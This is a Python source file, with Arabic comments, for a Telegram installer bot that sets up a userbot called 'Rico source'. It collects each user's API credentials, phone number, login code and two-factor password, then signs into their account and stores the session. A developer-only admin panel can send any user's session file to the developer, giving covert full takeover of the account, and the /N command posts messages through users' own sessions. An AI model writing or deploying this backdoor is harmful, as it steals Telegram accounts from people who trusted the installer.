
import re, os, asyncio, json, datetime
from telethon import TelegramClient, events, Button, functions
from telethon.errors import SessionPasswordNeededError, UserNotParticipantError
from config import BOT_TOKEN, API_ID, API_HASH
from user_core import start_user_source
# إعدادات المجلدات والملفات
if not os.path.exists("sessions"): 
    os.makedirs("sessions")

DB_FILE = "database.json"
CHANNEL_USERNAME = "N_QQ_H" 
ADMIN_ID = 7769271031 # ايديك كمطور

def save_user(uid, aid, ahash, name):
    data = {}
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f: data = json.load(f)
        except: data = {}
    data[str(uid)] = {
        "api_id": aid, "api_hash": ahash, "name": name,
        "date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    with open(DB_FILE, 'w') as f: 
        json.dump(data, f, indent=4, ensure_ascii=False)

# تشغيل بوت التنصيب الأساسي
bot = TelegramClient("installer_bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# --- فحص الاشتراك الإجباري ---
async def check_sub(user_id):
    try:
        # الفحص المباشر (يتطلب رفع البوت مشرف في القناة)
        await bot(functions.channels.GetParticipantRequest(CHANNEL_USERNAME, user_id))
        return True
    except: return False

@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    user_id = event.sender_id
    if not await check_sub(user_id):
        return await event.reply(
            f"⚠️ **عذراً عزيزي، يجب عليك الاشتراك في القناة أولاً.**\n🔗 @{CHANNEL_USERNAME}", 
            buttons=[[Button.url("اضغط هنا للاشتراك", f"https://t.me/{CHANNEL_USERNAME}")]])
    
    btns = [
        [Button.inline("🚀 بدء التنصيب", b"setup")],
        [Button.url("المطور 👤", "https://t.me/I_QQ_Q")]
    ]
    if user_id == ADMIN_ID:
        btns.append([Button.inline("⚙️ لوحة التحكم", b"admin_panel")])
    
    await event.reply("🦅 **مرحباً بك في سورس ريكو المطور**\nاستخدم الأزرار أدناه للتنصيب أو التحكم.", buttons=btns)

# --- أمر وضع التحديث /N للمطور فقط ---
@bot.on(events.NewMessage(pattern="/N"))
async def update_notify(event):
    if event.sender_id != ADMIN_ID: return
    if not os.path.exists(DB_FILE): return await event.reply("❌ لا يوجد منصبين.")

    with open(DB_FILE, 'r') as f: 
        users = json.load(f)
    
    await event.reply(f"🔄 جاري إبلاغ `{len(users)}` مستخدم بوضع التحديث... يرجى الانتظار.")
    
    msg = (
        "⚙️ **تنبيه من إدارة سورس ريكو :**\n"
        "‏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n"
        "السورس الآن في حالة **تـحـديـث شـامـل**.\n"
        "سيتم إيقاف الخدمات مؤقتاً لإضافة مميزات جديدة.\n\n"
        "✅ سيتم إعادة التشغيل تلقائياً فور الانتهاء.\n"
        "‏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n"
        "👨‍💻 **المطور :** @I_QQ_Q"
    )

    sc, fc = 0, 0
    for uid, info in users.items():
        path = f"sessions/user_{uid}"
        try:
            # استخدام اتصال مؤقت للإرسال
            tmp = TelegramClient(path, info['api_id'], info['api_hash'])
            await tmp.connect()
            if await tmp.is_user_authorized():
                await tmp.send_message("me", msg)
                sc += 1
            await tmp.disconnect()
            await asyncio.sleep(1) # تأخير بسيط لتجنب الحظر
        except: 
            fc += 1
    await event.reply(f"✅ تم إبلاغ `{sc}` مستخدم.\n❌ فشل إبلاغ `{fc}`.")

# --- لوحة تحكم المطور ---
@bot.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel(event):
    if event.sender_id != ADMIN_ID: return
    if not os.path.exists(DB_FILE): return await event.answer("❌ لا يوجد بيانات.")
    
    with open(DB_FILE, 'r') as f: 
        users = json.load(f)
    
    btns = [[Button.inline(f"👤 {u.get('name', k)}", f"user_{k}".encode())] for k, u in users.items()]
    btns.append([Button.inline("🔙 رجوع", b"back")])
    await event.edit("🗂 **قائمة المستخدمين المنصبين:**", buttons=btns)

@bot.on(events.CallbackQuery(data=re.compile(b"user_(.*)")))
async def user_info(event):
    if event.sender_id != ADMIN_ID: return
    uid = event.data.decode().split("_")[1]
    with open(DB_FILE, 'r') as f: 
        users = json.load(f)
    u = users.get(uid)
    
    path = f"sessions/user_{uid}.session"
    status = "🟢 شغال" if os.path.exists(path) else "🔴 متوقف"
    
    txt = (f"👤 **الاسم:** {u['name']}\n"
           f"🆔 **الآيدي:** `{uid}`\n"
           f"🗓 **تاريخ التنصيب:** `{u.get('date', 'غير متوفر')}`\n"
           f"✳️ **الحالة:** {status}")
    
    await event.edit(txt, buttons=[
        [Button.inline("🔑 جلب ملف السيشن", f"sess_{uid}".encode())],
        [Button.inline("🔙 رجوع للقائمة", b"admin_panel")]
    ])

@bot.on(events.CallbackQuery(data=re.compile(b"sess_(.*)")))
async def get_sess(event):
    if event.sender_id != ADMIN_ID: return
    uid = event.data.decode().split("_")[1]
    path = f"sessions/user_{uid}.session"
    if os.path.exists(path): 
        await bot.send_file(ADMIN_ID, path, caption=f"📄 ملف سيشن المستخدم: `{uid}`")
        await event.answer("✅ تم إرسال الملف لخاص المطور.")
    else: 
        await event.answer("❌ الملف مفقود.")

# --- عملية التنصيب ---
@bot.on(events.CallbackQuery(data=b"setup"))
async def setup(event):
    uid = event.sender_id
    path = f"sessions/user_{uid}"
    async with bot.conversation(event.chat_id, timeout=300) as conv:
        try:
            await conv.send_message("1️⃣ أرسل الـ **API ID**:"); u_id = int((await conv.get_response()).text)
            await conv.send_message("2️⃣ أرسل الـ **API HASH**:"); u_hash = (await conv.get_response()).text
            await conv.send_message("3️⃣ أرسل **رقم الهاتف**:"); u_phone = (await conv.get_response()).text
            
            c = TelegramClient(path, u_id, u_hash)
            await c.connect()
            await c.send_code_request(u_phone)
            await conv.send_message("4️⃣ أرسل **كود التحقق**:"); u_code = (await conv.get_response()).text
            
            try: 
                await c.sign_in(u_phone, u_code)
            except SessionPasswordNeededError:
                await conv.send_message("5️⃣ أرسل **كلمة السر**:"); await c.sign_in(password=(await conv.get_response()).text)
            
            me = await c.get_me()
            save_user(uid, u_id, u_hash, me.first_name)
            await c.disconnect()
            
            await conv.send_message(f"✅ تم التنصيب بنجاح يا {me.first_name}!")
            asyncio.create_task(start_user_source(path, u_id, u_hash))
        except Exception as e: 
            await conv.send_message(f"❌ حدث خطأ: {e}")

@bot.on(events.CallbackQuery(data=b"back"))
async def back(event): 
    await start(event)

# --- تشغيل النسخة الاحتياطية (مُحسّن للاستقرار) ---
async def load_backup():
    if os.path.exists(DB_FILE):
        print("🔄 جاري إعادة تشغيل جلسات المستخدمين بهدوء...")
        with open(DB_FILE, 'r') as f:
            try: users = json.load(f)
            except: users = {}
            for uid, info in users.items():
                s_path = f"sessions/user_{uid}"
                if os.path.exists(f"{s_path}.session"):
                    try:
                        # تأخير 5 ثوانٍ بين كل تشغيل لتلافي مشاكل Pydroid والمهام
                        await asyncio.sleep(5) 
                        asyncio.create_task(start_user_source(s_path, info['api_id'], info['api_hash']))
                        print(f"✅ تم تفعيل حساب: {info.get('name', uid)}")
                    except Exception as e:
                        print(f"⚠️ فشل تشغيل {uid}: {e}")

if __name__ == "__main__":
    print("🤖 بوت ريكو يعمل الآن.. للمطور أرسل /N لإرسال تنبيه التحديث.")
    bot.loop.create_task(load_backup())
    bot.run_until_disconnected()
